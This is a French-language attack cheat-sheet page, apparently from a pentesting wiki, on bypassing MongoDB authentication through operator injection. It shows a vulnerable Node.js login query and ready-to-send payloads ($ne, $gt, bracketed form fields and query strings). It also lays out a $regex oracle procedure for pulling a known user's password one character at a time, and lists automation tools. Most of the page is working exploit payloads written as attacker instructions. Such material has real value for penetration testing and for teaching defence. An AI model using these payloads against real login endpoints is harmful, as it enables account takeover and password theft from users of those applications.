---
title: "Contournement d'authentification via injection d'opérateur MongoDB"
description: "Remplacer une chaîne de mot de passe par un objet opérateur tel que {\"$ne\":null} transforme une recherche de connexion en filtre toujours vrai, permettant la connexion sans identifiants."
keywords:
  - contournement d'authentification MongoDB
  - contournement de connexion NoSQL
  - opérateur $ne
  - injection d'opérateur
  - brute force de mot de passe
  - $regex
---

# Contournement d'authentification

L'attaque MongoDB canonique transforme une requête de connexion en filtre toujours vrai en envoyant un **opérateur** de requête là où l'application attend une chaîne de mot de passe. Elle fonctionne dès lors que le handler construit le filtre à partir des champs de la requête sans les forcer en chaînes.

## Schéma vulnérable

```javascript
// fields taken straight from the parsed request body
const user = await db.collection("users").findOne({
  username: req.body.username,
  password: req.body.password
});
if (user) { /* authenticated */ }
```

Si `req.body.password` est une chaîne, le filtre compare par égalité. Si c'est un **objet**, cet objet est interprété comme un opérateur et la vérification d'égalité disparaît.

## Le payload canonique

Envoyez du JSON où le mot de passe est un opérateur qui matche toute valeur stockée :

```json
{"username": "admin", "password": {"$ne": null}}
```

`$ne` signifie « non égal », donc `password != null` est vrai pour chaque utilisateur qui possède un mot de passe. La requête renvoie le document `admin` et la session est établie sans connaître le mot de passe. `$gt` contre une chaîne vide est équivalent et passe souvent au travers des filtres naïfs qui ne recherchent que `$ne` :

```json
{"username": "admin", "password": {"$gt": ""}}
```

Lorsque le nom d'utilisateur est également inconnu, faites en sorte que les deux champs matchent n'importe quoi et prenez le premier document que le driver renvoie :

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## L'analyse du framework transforme les chaînes en opérateurs

L'attaque ne se limite pas aux corps JSON. Les analyseurs de query-string et de formulaires URL-encodés qui prennent en charge les clés imbriquées (Express avec `qs`/`body-parser`, l'analyse native de PHP) construisent un objet à partir de la notation entre crochets. Un formulaire de connexion posté en `application/x-www-form-urlencoded` avec ces champs :

```
username=admin&password[$ne]=null
```

est analysé en `{ username: "admin", password: { $ne: "null" } }`, de sorte que `password` arrive comme objet opérateur exactement comme le ferait la forme JSON. Cela fonctionne de la même façon dans une query string GET :

```
/login?username=admin&password[$ne]=
```

L'analyseur de PHP produit la structure identique à partir de `password[$ne]=1`, ce qui est la façon dont les contournements classiques `$where`/`$ne` étaient livrés contre les applications MongoDB PHP. La précondition reste inchangée : la valeur doit atteindre le filtre en tant qu'objet analysé, et non après un cast tel que `(string)$_POST['password']` ou `String(req.body.password)`.

## $regex pour confirmer et brute-forcer le mot de passe d'un utilisateur connu

Une fois un nom d'utilisateur connu, `$regex` transforme l'endpoint de connexion en oracle pour le mot de passe lui-même. Un regex qui matche n'importe quoi confirme que le compte existe et que le champ est injectable :

```json
{"username": "admin", "password": {"$regex": ".*"}}
```

Ancrez le motif pour récupérer le mot de passe caractère par caractère. Une connexion réussie (ou toute différence observable : redirection, set-cookie, longueur de réponse) signifie que le préfixe a matché :

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
```

Parcourez l'alphabet à chaque position, conservez le caractère qui authentifie, et étendez l'ancre jusqu'à récupérer la valeur complète. En forme URL-encodée :

```
username=admin&password[$regex]=^adm
```

Échappez les métacaractères regex dans les caractères candidats (`.`, `*`, `+`, `$`, `\`) pour qu'ils matchent littéralement. Cela récupère les mots de passe stockés en clair ou sous forme réversible ; contre un champ hashé, le regex matche la chaîne du hash, ce qui reste utile lorsque le hash est prévisible ou lorsque le champ contient un token.

## Outils

- **NoSQLMap** : automatiser le contournement de connexion par injection d'opérateur contre l'endpoint.
- **nosqli** : scanner les paramètres de connexion à la recherche d'objets opérateurs injectables.
- **Burp Repeater** : envoyer des payloads $ne, $gt ou $regex en JSON ou en champs de formulaire entre crochets.

## Références

- [MongoDB : Query comparison operators](https://www.mongodb.com/docs/manual/reference/operator/query-comparison/)
- [MongoDB : $regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
